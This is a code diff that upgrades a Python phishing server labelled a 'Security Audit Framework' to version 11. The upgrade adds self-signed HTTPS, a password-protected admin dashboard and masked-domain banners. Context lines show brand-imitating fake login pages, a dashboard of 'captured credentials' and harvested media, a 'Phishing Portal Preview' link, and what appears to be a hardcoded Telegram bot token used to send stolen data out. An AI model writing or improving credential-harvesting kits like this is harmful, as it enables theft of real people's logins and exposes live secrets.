@@ -8,10 +8,14 @@ import threading
 import json
 import base64
 import sys
+import ssl
+import subprocess
 
 PORT = 8080
 LOG_FILE = "audit_results.log"
 MEDIA_DIR = "captured_media"
+CERT_FILE = "cert.pem"
+KEY_FILE = "key.pem"
 
 if not os.path.exists(MEDIA_DIR):
     os.makedirs(MEDIA_DIR)
@@ -19,6 +23,23 @@ if not os.path.exists(MEDIA_DIR):
 # Telegram Bot Configuration
 TELEGRAM_BOT_TOKEN = "9111398440:AAEndzRhZegO5UqDoDckMgQdXZs1V3feyag"
 TELEGRAM_CHAT_ID = "8878200031"
+
+# Admin Dashboard Credentials
+ADMIN_USER = "admin"
+ADMIN_PASS = "audit2026"
+
+def generate_self_signed_cert():
+    """Automatically generates self-signed SSL certificate for HTTPS support."""
+    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
+        try:
+            subprocess.run([
+                "openssl", "req", "-x509", "-newkey", "rsa:2048",
+                "-keyout", KEY_FILE, "-out", CERT_FILE, "-days", "365",
+                "-nodes", "-subj", "/CN=localhost"
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+            print("[+] Self-signed SSL certificate generated successfully for HTTPS.")
+        except Exception as e:
+            print(f"[-] Warning: Could not generate SSL cert via OpenSSL: {e}")
 
 def trigger_beep():
     """Triggers a terminal audio beep alert."""
@@ -130,7 +151,7 @@ def generate_html(template):
 </head>
 <body>
     <div class="card" id="captureArea">
-        <div class="mask-banner">🔒 Secure Audit Domain: <b>__MASK_HINT__.audit-system.local</b></div>
+        <div class="mask-banner">🔒 Secure HTTPS Domain: <b>__MASK_HINT__.audit-system.local</b></div>
         <h2>__NAME__</h2>
         <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
         <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
@@ -302,7 +323,7 @@ def generate_admin_dashboard():
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Framework v10 - Admin Dashboard</title>
+    <title>Framework v11 - Admin Dashboard</title>
     <style>
         body {{ font-family: Arial, sans-serif; background: #121212; color: #e0e0e0; margin: 0; padding: 20px; }}
         h1 {{ color: #00ffcc; }}
@@ -319,8 +340,8 @@ def generate_admin_dashboard():
 </head>
 <body>
     <div class="container">
-        <h1>🛡️ Security Audit Framework v10 - Admin Dashboard</h1>
-        <p>Live session telemetry, captured credentials, and harvested media monitor.</p>
+        <h1>🛡️ Security Audit Framework v11 - Secured Dashboard</h1>
+        <p>Production-grade telemetry monitor with authenticated session control.</p>
         <a href="/" class="btn" target="_blank">🌐 Open Phishing Portal Preview</a>
         
         <div class="section">
@@ -370,8 +391,22 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
             return forwarded.split(',')[0].strip()
         return self.client_address[0]
 
+    def authenticate_admin(self):
+        auth_header = self.headers.get('Authorization')
+        expected_auth = "Basic " + base64.b64encode(f"{ADMIN_USER}:{ADMIN_PASS}".encode()).decode()
+        if auth_header == expected_auth:
+            return True
+        return False
+
     def do_GET(self):
         if self.path == '/admin-panel':
+            if not self.authenticate_admin():
+                self.send_response(401)
+                self.send_header('WWW-Authenticate', 'Basic realm="Secured Admin Dashboard v11"')
+                self.end_headers()
+                self.wfile.write(b"Unauthorized Access - Authentication Required")
+                return
+
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
@@ -524,7 +559,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
 def select_template():
     global SELECTED_TEMPLATE
     print("\n==============================================")
-    print("   ADVANCED SECURITY AUDIT FRAMEWORK v10      ")
+    print("   ADVANCED SECURITY AUDIT FRAMEWORK v11      ")
     print("==============================================")
     print(" Please select a target template / brand:")
     print("----------------------------------------------")
@@ -541,16 +576,26 @@ def select_template():
 
 def run_server():
     select_template()
+    generate_self_signed_cert()
+    
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Framework v10 running on port {PORT}...\033[0m")
-    print(f"\033[96m[*] Admin Dashboard available at: http://localhost:{PORT}/admin-panel\033[0m")
+    
+    # Enable HTTPS (SSL/TLS Wrap)
+    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
+        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+        print(f"\033[92m[*] HTTPS Enabled (SSL Certificate Active)\033[0m")
+    
+    print(f"\033[96m[*] Framework v11 running securely on https://localhost:{PORT}...\033[0m")
+    print(f"\033[96m[*] Secured Admin Dashboard: https://localhost:{PORT}/admin-panel (User: admin / Pass: audit2026)\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     print(f"\033[96m[*] Captured media will be saved in {MEDIA_DIR}/\033[0m")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n\033[91m[-] Shutting down framework v10.\033[0m")
+        print("\n\033[91m[-] Shutting down framework v11.\033[0m")
         httpd.server_close()
 
 if __name__ == '__main__':
